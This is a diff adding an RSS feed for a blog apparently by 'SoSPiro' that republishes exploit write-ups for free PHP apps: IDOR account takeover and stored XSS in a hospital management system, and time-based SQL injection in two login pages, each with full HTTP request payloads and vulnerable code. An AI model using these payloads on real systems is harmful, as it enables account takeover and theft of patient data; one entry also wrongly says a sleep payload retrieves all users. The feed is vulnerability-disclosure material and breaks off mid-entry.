@@ -1,0 +1,787 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Hacker-Blog</title>
+    <description>The Dark Side of Technology</description>
+    <link>http://localhost:8000</link>
+    <atom:link href="http://localhost:8000/feed.xml" rel="self" type="application/rss+xml" />
+    <author>
+      <name>SoSPiro</name>
+      <email>SoSPiro@mail.com</email>
+      <uri>http://0.0.0.0:8000/hacker-blog-master</uri>
+    </author>
+    
+      <item>
+        <title>Hospital Management System 1.0 Insecure Direct Object Reference / Account Takeover</title>
+        <description>&lt;ul&gt;
+  &lt;li&gt;Exploit Title: Hospital Management System - IDOR + Accaunt Takeover&lt;/li&gt;
+  &lt;li&gt;Google Dork: N/A&lt;/li&gt;
+  &lt;li&gt;Application: Hospital Management System&lt;/li&gt;
+  &lt;li&gt;Date: 27.02.2024&lt;/li&gt;
+  &lt;li&gt;Bugs: IDOR + Accaunt Takeover&lt;/li&gt;
+  &lt;li&gt;Exploit Author: SoSPiro&lt;/li&gt;
+  &lt;li&gt;Vendor Homepage: https://www.sourcecodester.com/&lt;/li&gt;
+  &lt;li&gt;Software Link: https://www.sourcecodester.com/php/16720/free-hospital-management-system-small-practices.html&lt;/li&gt;
+  &lt;li&gt;Version: 1.0&lt;/li&gt;
+  &lt;li&gt;Tested on: Windows 10 64 bit Wampserver&lt;/li&gt;
+  &lt;li&gt;CVE : N/A&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;vulnerability-description&quot;&gt;Vulnerability Description:&lt;/h3&gt;
+
+&lt;p&gt;This report focuses on two vulnerabilities known as “Insecure Direct Object References (IDOR)” and “Account Takeover”. These vulnerabilities occur in a scenario where user input and access privileges validation is inadequate.&lt;/p&gt;
+
+&lt;h3 id=&quot;proof-of-concept-poc&quot;&gt;Proof of Concept (PoC):&lt;/h3&gt;
+
+&lt;p&gt;&lt;strong&gt;Target User Information:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;---------------------------------
+User 1:
+ID: 1
+Email: patient@patient.com
+Password: patient
+---------------------------------
+User 2:
+ID: 4
+Email: attack@ker
+Password: q1w2e3
+---------------------------------
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;User 1 Request&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /Vaidya%20Mitra/vm/patient/edit-user.php HTTP/1.1
+Host: localhost
+Cookie: _ga=GA1.1.2080672900.1708952048; _gid=GA1.1.1833914840.1708952048; PHPSESSID=f6je8gcsm0h685mfr2g37ot8to
+...
+id00=1&amp;amp;oldemail=patient%40patient.com&amp;amp;email=patient%40patient.com&amp;amp;name=Mrs.Sunita+Dighe&amp;amp;nic=422201&amp;amp;Tele=9090909091&amp;amp;address=India&amp;amp;password=patient&amp;amp;cpassword=patient
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;User 2 Request&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /Vaidya%20Mitra/vm/patient/edit-user.php HTTP/1.1
+Host: localhost
+Cookie: PHPSESSID=4c8per12a8freilu1upich92a4
+...
+id00=4&amp;amp;oldemail=attack%40ker&amp;amp;email=attack%40ker&amp;amp;name=attack+attacker&amp;amp;nic=123123123&amp;amp;Tele=0712345677&amp;amp;address=attac&amp;amp;password=q1w2e3&amp;amp;cpassword=q1w2e3
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Attacker’s Request&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;The attacker aims to modify the account details of “patient 1” and sends the following HTTP request:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /Vaidya%20Mitra/vm/patient/edit-user.php HTTP/1.1
+Host: localhost
+Cookie: PHPSESSID=4c8per12a8freilu1upich92a4
+...
+id00=1&amp;amp;oldemail=patient%40patient.com&amp;amp;email=patient%40patient.com&amp;amp;name=MRRS.Sunita+Dighe&amp;amp;nic=422201&amp;amp;Tele=9090909091&amp;amp;address=attac&amp;amp;password=q1w2e3&amp;amp;cpassword=q1w2e3
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;In the above SQL queries, the $id value received from the user is directly included in the query and security
+checks are not performed. This allows exploiting another user’s information. At the same time, since
+the user’s identity is obtained from the POST data, the attacker can pass his identity as another user’s identity.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=pmoBSnu9IYI&quot;&gt;Poc viode&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;vulnerable-code-section&quot;&gt;Vulnerable code section:&lt;/h3&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$sql1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;update patient set pemail=&apos;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$email&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&apos;,pname=&apos;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$name&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&apos;,ppassword=&apos;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$password&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&apos;,pnic=&apos;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$nic&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&apos;,ptel=&apos;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$tele&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&apos;,paddress=&apos;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$address&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&apos; where pid=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$id&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; ;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$database&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$sql1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$sql1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$sql1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;update webuser set email=&apos;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$email&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&apos; where email=&apos;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$oldemail&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&apos; ;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$database&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$sql1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$sql1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;risks-this-security-vulnerability-exposes-user-information-to-unauthorized-access-and-modifications-consequently-there-are-potential-risks-such-as-account-takeover-privacy-breaches-and-non-compliance-with-security-policies-which-can-lead-to-substantial-damage-and-security-breaches-in-the-system&quot;&gt;&lt;strong&gt;Risks This security vulnerability exposes user information to unauthorized access and modifications. Consequently, there are potential risks such as account takeover, privacy breaches, and non-compliance with security policies, which can lead to substantial damage and security breaches in the system.&lt;/strong&gt;&lt;/h3&gt;
+</description>
+        <pubDate>Tue, 27 Feb 2024 00:00:00 +0400</pubDate>
+        <link>http://localhost:8000//Hospital-Management-System-1.0-Insecure-Direct-Object-Reference-+-Account-Takeover</link>
+        <link href="http://localhost:8000/Hospital-Management-System-1.0-Insecure-Direct-Object-Reference-+-Account-Takeover"/>
+        <guid isPermaLink="true">http://localhost:8000/Hospital-Management-System-1.0-Insecure-Direct-Object-Reference-+-Account-Takeover</guid>
+      </item>
+    
+      <item>
+        <title>Hospital Management System 1.0 Cross Site Scripting</title>
+        <description>&lt;ul&gt;
+  &lt;li&gt;Exploit Title: Hospital Management System - Stord XSS&lt;/li&gt;
+  &lt;li&gt;Google Dork: N/A&lt;/li&gt;
+  &lt;li&gt;Application: Hospital Management System&lt;/li&gt;
+  &lt;li&gt;Date: 27.02.2024&lt;/li&gt;
+  &lt;li&gt;Bugs: Stord XSS&lt;/li&gt;
+  &lt;li&gt;Exploit Author: SoSPiro&lt;/li&gt;
+  &lt;li&gt;Vendor Homepage: https://www.sourcecodester.com/&lt;/li&gt;
+  &lt;li&gt;Software Link: https://www.sourcecodester.com/php/16720/free-hospital-management-system-small-practices.html&lt;/li&gt;
+  &lt;li&gt;Version: 1.0&lt;/li&gt;
+  &lt;li&gt;Tested on: Windows 10 64 bit Wampserver&lt;/li&gt;
+  &lt;li&gt;CVE : N/A&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;vulnerability-description&quot;&gt;Vulnerability Description:&lt;/h3&gt;
+&lt;p&gt;A security vulnerability has been identified in the “Vaidya Mitra” healthcare application, specifically in the doctor’s account settings functionality. The issue arises due to inadequate input validation, allowing an attacker to inject malicious scripts into the system, leading to a Cross-Site Scripting (XSS) vulnerability.&lt;/p&gt;
+
+&lt;h3 id=&quot;proof-of-concept-poc&quot;&gt;Proof of Concept (PoC):&lt;/h3&gt;
+&lt;ol&gt;
+  &lt;li&gt;Exploiting Doctor’s Account Settings:&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;The attacker, using the Burp Suite Proxy tool, intercepts and modifies a POST request sent by the doctor to update their account settings.
+The payload &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&lt;/code&gt; is injected into the email parameter.
+The manipulated request looks like the following:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /Vaidya%20Mitra/vm/doctor/edit-doc.php HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0
+...
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 170
+...
+
+id00=2&amp;amp;oldemail=doctor%40doctor.com&amp;amp;email=doctor%40doctor.com&amp;lt;script&amp;gt;alert(1123)&amp;lt;/script&amp;gt;&amp;amp;name=Dr.Akash+Sanap&amp;amp;nic=234&amp;amp;Tele=8080808080&amp;amp;spec=1&amp;amp;password=doctor&amp;amp;cpassword=doctor
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Upon submission, the payload gets stored in the doctor’s email field.&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Triggering XSS in Admin’s View:&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;An admin viewing doctors’ information at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://localhost/Vaidya%20Mitra/vm/admin/doctors.php&lt;/code&gt; inadvertently triggers the XSS vulnerability.
+The admin sends a GET request to view a doctor’s details:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GET /Vaidya%20Mitra/vm/admin/doctors.php?action=view&amp;amp;id=2 HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0
+...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The server returns the doctor’s information, and the XSS payload in the email field is executed in the admin’s browser, leading to the alert being triggered.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://drive.google.com/file/d/1dCz5Q3mKMfpB2pjPeOV6ZoBi1Nj74DR1/view?usp=drive_link&quot;&gt;PoC - video&lt;/a&gt;&lt;/p&gt;
+</description>
+        <pubDate>Tue, 27 Feb 2024 00:00:00 +0400</pubDate>
+        <link>http://localhost:8000//Hospital-Management-System-1.0-Cross-Site-Scripting</link>
+        <link href="http://localhost:8000/Hospital-Management-System-1.0-Cross-Site-Scripting"/>
+        <guid isPermaLink="true">http://localhost:8000/Hospital-Management-System-1.0-Cross-Site-Scripting</guid>
+      </item>
+    
+      <item>
+        <title>Simple Inventory Management System 1.0 SQL Injection</title>
+        <description>&lt;ul&gt;
+  &lt;li&gt;Exploit Title: Simple Inventory Management System - SQL Injection&lt;/li&gt;
+  &lt;li&gt;Google Dork: N/A&lt;/li&gt;
+  &lt;li&gt;Application: Simple Inventory Management System&lt;/li&gt;
+  &lt;li&gt;Date: 26.02.2024&lt;/li&gt;
+  &lt;li&gt;Bugs: SQL Injection&lt;/li&gt;
+  &lt;li&gt;Exploit Author: SoSPiro&lt;/li&gt;
+  &lt;li&gt;Vendor Homepage: https://www.sourcecodester.com/&lt;/li&gt;
+  &lt;li&gt;Software Link: https://www.sourcecodester.com/php/15419/simple-inventory-management-system-phpoop-free-source-code.html&lt;/li&gt;
+  &lt;li&gt;Version: 1.0&lt;/li&gt;
+  &lt;li&gt;Tested on: Windows 10 64 bit Wampserver&lt;/li&gt;
+  &lt;li&gt;CVE : N/A&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;vulnerability-description&quot;&gt;Vulnerability Description:&lt;/h3&gt;
+
+&lt;p&gt;This code snippet is potentially vulnerable to SQL Injection. User inputs &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;($_POST[&apos;email&apos;] and $_POST[&apos;pwd&apos;])&lt;/code&gt; are directly incorporated into the SQL query without proper validation or sanitization, exposing the application to the risk of manipulation by malicious users. This could allow attackers to inject SQL code through specially crafted input.&lt;/p&gt;
+
+&lt;h3 id=&quot;proof-of-concept-poc&quot;&gt;Proof of Concept (PoC):&lt;/h3&gt;
+
+&lt;p&gt;An example attacker could input the following values:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-plantext&quot;&gt;email: test@gmail.com&apos;%2b(select*from(select(sleep(20)))a)%2b&apos;
+pwd: test
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This would result in the following SQL query:&lt;/p&gt;
+
+&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;users&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;email&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;test@gmail.com&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;select&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;from&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;select&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;AND&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;anything&apos;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This attack would retrieve all users, making the login process always successful.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://i.imgur.com/slkzYJt.png&quot;&gt;Request Response foto&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;vulnerable-code-section&quot;&gt;Vulnerable code section:&lt;/h3&gt;
+
+&lt;hr /&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ims/login.php
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; 
+&lt;span class=&quot;nb&quot;&gt;ob_start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;session_start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;inc/header.php&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$loginError&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;empty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;email&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;empty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;pwd&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;Inventory.php&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;nv&quot;&gt;$inventory&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Inventory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+
+  &lt;span class=&quot;c1&quot;&gt;// Vulnerable code&lt;/span&gt;
+  &lt;span class=&quot;nv&quot;&gt;$login&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$inventory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;login&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;email&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;pwd&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt; 
+  &lt;span class=&quot;c1&quot;&gt;//&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;empty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$login&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;nv&quot;&gt;$_SESSION&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;userid&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$login&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;userid&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+    &lt;span class=&quot;nv&quot;&gt;$_SESSION&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;name&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$login&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;name&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;      
+    &lt;span class=&quot;nb&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Location:index.php&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;nv&quot;&gt;$loginError&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Invalid email or password!&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+</description>
+        <pubDate>Mon, 26 Feb 2024 00:00:00 +0400</pubDate>
+        <link>http://localhost:8000//Simple-Inventory-Management-System-1.0-SQL-Injection</link>
+        <link href="http://localhost:8000/Simple-Inventory-Management-System-1.0-SQL-Injection"/>
+        <guid isPermaLink="true">http://localhost:8000/Simple-Inventory-Management-System-1.0-SQL-Injection</guid>
+      </item>
+    
+      <item>
+        <title>Hospital Management System 1.0 SQL Injection</title>
+        <description>&lt;ul&gt;
+  &lt;li&gt;Exploit Title: Hospital Management System - SQL Injection&lt;/li&gt;
+  &lt;li&gt;Google Dork: N/A&lt;/li&gt;
+  &lt;li&gt;Application: Hospital Management System&lt;/li&gt;
+  &lt;li&gt;Date: 26.02.2024&lt;/li&gt;
+  &lt;li&gt;Bugs: SQL Injection&lt;/li&gt;
+  &lt;li&gt;Exploit Author: SoSPiro&lt;/li&gt;
+  &lt;li&gt;Vendor Homepage: https://www.sourcecodester.com/&lt;/li&gt;
+  &lt;li&gt;Software Link: https://www.sourcecodester.com/php/16720/free-hospital-management-system-small-practices.html&lt;/li&gt;
+  &lt;li&gt;Version: 1.0&lt;/li&gt;
+  &lt;li&gt;Tested on: Windows 10 64 bit Wampserver&lt;/li&gt;
+  &lt;li&gt;CVE : N/A&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;vulnerability-description&quot;&gt;Vulnerability Description:&lt;/h3&gt;
+
+&lt;p&gt;A security vulnerability has been identified in this web application due to the direct inclusion of user-input data into SQL queries, rendering it susceptible to SQL Injection attacks. This vulnerability may enable malicious actors to gain unauthorized access to sensitive information.&lt;/p&gt;
+
+&lt;h3 id=&quot;proof-of-concept-poc&quot;&gt;Proof of Concept (PoC):&lt;/h3&gt;
+
+&lt;p&gt;Below is an example of an attack that a malicious actor could execute to exploit this vulnerability.&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /Vaidya%20Mitra/vm/login.php HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 80
+Origin: http://localhost
+Connection: close
+Referer: http://localhost/Vaidya%20Mitra/vm/login.php
+Cookie: _ga=GA1.1.2080672900.1708952048; _gid=GA1.1.1833914840.1708952048; PHPSESSID=18a16tga7k2glh7
+
+useremail=test@123.asd&apos;%2b(select*from(select(sleep(5)))a)%2b&apos;&amp;amp;userpassword=test
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;In this example, the payload appended to the useremail parameter aims to execute a sleep function, intentionally delaying the server’s response time. Real-world attacks could involve more malicious operations.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://i.imgur.com/LxENLBz.png&quot;&gt;Request - Response foto&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;vulnerable-code-section&quot;&gt;Vulnerable code section:&lt;/h3&gt;
+
+&lt;hr /&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/Vaidya%20Mitra/vm/login.php
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
